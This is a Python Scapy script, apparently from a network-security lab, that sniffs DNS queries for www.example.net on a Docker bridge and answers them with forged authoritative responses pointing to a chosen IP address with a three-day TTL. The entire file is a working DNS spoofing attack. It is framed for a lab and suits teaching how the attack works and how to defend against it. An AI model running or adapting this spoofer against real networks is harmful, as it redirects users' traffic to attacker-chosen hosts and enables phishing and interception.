#!/usr/bin/env python3

from scapy.all import DNS, IP, sniff, UDP, DNSRR, send, get_if_addr, get_if_list


def find_iface(bridge_ip='10.9.0.1'):
    """Auto-detect the host bridge interface backing net-10.9.0.0 (its
    address is 10.9.0.1), instead of hard-coding a br-<id> name that changes
    whenever the Docker network is recreated."""
    for iface in get_if_list():
        try:
            if get_if_addr(iface) == bridge_ip:
                return iface
        except Exception:
            continue
    raise SystemExit(
        f"Could not find the interface for {bridge_ip}. Is the lab running, "
        "and is this container started with network_mode: host?")


IFACE = find_iface()
# Sniff UDP query packets and invoke spoof_dns().
# Spoof the DNS response to www.example.net for the query packets
FILTER = 'udp and dst port 53'
DOMAIN = 'www.example.net'
# Pick an IP address to which the DNS response should be spoofed
SPOOFED_IP = '208.67.220.220'  # Open DNS IP address


def spoof_dns(pkt):
    if DNS in pkt and DOMAIN in pkt[DNS].qd.qname.decode('utf-8'):
        print(
            f"DNS: {pkt[IP].src}: {pkt[UDP].sport} --> \
                {pkt[IP].dst}: {pkt[UDP].dport} id: {pkt[DNS].id} \
                    {pkt[DNS].qd.qname.decode('utf-8')}")
        print(f'Found {DOMAIN} in query...')
        # Swap the source and destination IP address
        IP_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDP_pkt = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

        # The Answer Section
        Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                        rdata=SPOOFED_IP, ttl=259200)

        # Construct the DNS packet
        # qr = 1 (response), opcode = 0 (standard query),
        # aa = 1 (authoritative answer)
        DNS_pkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                      qdcount=1, ancount=1, an=Ans_sec)

        # Construct the entire IP packet and send it out
        spoofpkt = IP_pkt/UDP_pkt/DNS_pkt
        print("Sending spoofed packet")
        print(spoofpkt.show())
        send(spoofpkt)


if __name__ == "__main__":
    print('Starting DNS sniffing & spoofing...')
    pkt = sniff(iface=IFACE, filter=FILTER, prn=spoof_dns)
